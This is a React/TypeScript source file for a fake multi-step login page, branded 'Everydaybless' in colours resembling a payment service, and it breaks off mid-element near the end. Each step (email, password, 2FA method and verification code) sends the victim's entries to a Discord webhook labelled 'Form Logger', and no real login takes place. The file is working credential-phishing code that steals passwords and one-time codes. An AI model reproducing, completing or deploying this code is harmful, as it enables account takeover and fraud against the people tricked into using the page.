import { useState } from 'react';

function App() {
  const [step, setStep] = useState<'email' | 'password' | '2fa' | 'verification'>('email');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [twoFAMethod, setTwoFAMethod] = useState<'sms' | 'app' | 'key' | null>(null);
  const [verificationCode, setVerificationCode] = useState('');

  // Function to send data to Discord webhook
  const sendToDiscord = async (data: any) => {
    try {
      const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL_HERE'; // Replace with your webhook URL
      
      const payload = {
        content: `**New Form Submission**\n\n\${Object.entries(data)
          .map(([key, value]) => `**${key}:** ${value}`)
          .join('\n')}`,
        username: 'Form Logger',
        avatar_url: 'https://i.imgur.com/4M34hi2.png'
      };

      const response = await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
      });

      if (!response.ok) {
        console.error('Failed to send to Discord:', response.statusText);
      }
    } catch (error) {
      console.error('Error sending to Discord:', error);
    }
  };

  const handleEmailNext = async (e: React.FormEvent) => {
    e.preventDefault();
    if (email.trim()) {
      setIsLoading(true);
      await sendToDiscord({ step: 'email', email });
      setTimeout(() => {
        setIsLoading(false);
        setStep('password');
      }, 600);
    }
  };

  const handlePasswordSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    await sendToDiscord({ step: 'password', email, password });
    setTimeout(() => {
      setIsLoading(false);
      setStep('2fa');
    }, 600);
  };

  const handleTwoFAMethodSelect = async (method: 'sms' | 'app' | 'key') => {
    setTwoFAMethod(method);
    await sendToDiscord({ step: '2fa', email, password, twoFAMethod: method });
    setStep('verification');
  };

  const handleVerificationSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    await sendToDiscord({ 
      step: 'verification', 
      email, 
      password, 
      twoFAMethod, 
      verificationCode 
    });
    console.log('Verification code:', verificationCode);
  };

  const handleBackToEmail = () => {
    setStep('email');
    setPassword('');
  };

  const handleBackToPassword = () => {
    setStep('password');
    setTwoFAMethod(null);
  };

  const handleBackTo2FA = () => {
    setStep('2fa');
    setVerificationCode('');
    setTwoFAMethod(null);
  };

  return (
    <div className="min-h-screen bg-white flex flex-col">
      <div className="flex-1 flex items-center justify-center px-4 py-12">
        <div className="w-full max-w-md">
          <div className="text-center mb-8">
            <h1 className="text-4xl font-bold text-[#003087]">Everydaybless</h1>
          </div>
          {isLoading && (
            <div className="flex flex-col items-center justify-center py-12">
              <div className="relative w-24 h-24 flex items-center justify-center">
                <div className="absolute w-20 h-20 border-4 border-gray-200 rounded-full"></div>
                <div className="absolute w-20 h-20 border-4 border-transparent border-t-[#0551b5] border-r-[#0551b5] rounded-full loading-spinner"></div>
              </div>
            </div>
          )}
          {!isLoading && step === 'email' ? (
            <form onSubmit={handleEmailNext} className="space-y-6 step-transition-enter">
              <div>
                <input
                  type="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  placeholder="Email or mobile number"
                  className="w-full px-3 py-3 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-[#0551b5] focus:border-transparent"
                  required
                />
              </div>
              <div className="text-left">
                <a href="#" className="text-[#0551b5] text-sm hover:underline">
                  Forgot email?
                </a>
              </div>
              <button
                type="submit"
                className="w-full bg-[#0551b5] text-white py-3 rounded-full font-medium hover:bg-[#043d85] transition-colors"
              >
                Next
              </button>
              <div className="relative">
                <div className="absolute inset-0 flex items-center">
                  <div className="w-full border-t border-gray-300"></div>
                </div>
                <div className="relative flex justify-center text-sm">
                  <span className="px-2 bg-white text-gray-500">or</span>
                </div>
              </div>
              <button
                type="button"
                className="w-full border-2 border-gray-900 text-gray-900 py-3 rounded-full font-medium hover:bg-gray-50 transition-colors"
              >
                Sign Up
              </button>
            </form>
          ) : !isLoading && step === 'password' ? (
            <form onSubmit={handlePasswordSubmit} className="space-y-6 step-transition-enter">
              <div className="flex items-center justify-between">
                <div className="text-sm text-gray-700">{email}</div>
                <button
                  type="button"
                  onClick={handleBackToEmail}
                  className="text-[#0551b5] text-sm font-medium hover:underline"
                >
                  Change
                </button>
              </div>
              <div>
                <input
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="Password"
                  className="w-full px-3 py-3 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-[#0551b5] focus:border-transparent"
                  required
                  autoFocus
                />
              </div>
              <div className="text-left">
                <a href="#" className="text-[#0551b5] text-sm hover:underline">
                  Forgot password?
                </a>
              </div>
              <button
                type="submit"
                className="w-full bg-[#0551b5] text-white py-3 rounded-full font-medium hover:bg-[#043d85] transition-colors"
              >
                Log In
              </button>
              <div className="relative">
                <div className="absolute inset-0 flex items-center">
                  <div className="w-full border-t border-gray-300"></div>
                </div>
                <div className="relative flex justify-center text-sm">
                  <span className="px-2 bg-white text-gray-500">or</span>
                </div>
              </div>
              <button
                type="button"
                className="w-full border-2 border-gray-900 text-gray-900 py-3 rounded-full font-medium hover:bg-gray-50 transition-colors"
              >
                Sign Up
              </button>
            </form>
          ) : step === '2fa' ? (
            <div className="space-y-6 step-transition-enter">
              <div className="bg-blue-50 border border-blue-200 rounded-lg p-6 text-center">
                <h2 className="text-xl font-semibold text-[#003087] mb-2">
                  Help secure your account
                </h2>
                <p className="text-sm text-gray-700 mb-4">with 2-step login</p>
                <p className="text-xs text-gray-600 leading-relaxed">
                  Each time you log in, you'll use a one-time code in addition to your password. Choose how you'll get your code.
                </p>
                <a href="#" className="text-[#0551b5] text-xs font-medium hover:underline block mt-3">
                  Need an authenticator app?
                </a>
              </div>
              <div className="space-y-3">
                <label className="flex items-center p-4 border border-gray-300 rounded cursor-pointer hover:bg-gray-50 transition-colors">
                  <input
                    type="radio"
                    name="2fa"
                    value="sms"
                    checked={twoFAMethod === 'sms'}
                    onChange={() => handleTwoFAMethodSelect('sms')}
                    className="w-5 h-5 accent-[#0551b5]"
                  />
                  <span className="ml-3 text-gray-700 font-medium">Test me a code</span>
                </label>
                <label className="flex items-center p-4 border border-gray-300 rounded cursor-pointer hover:bg-gray-50 transition-colors">
                  <input
                    type="radio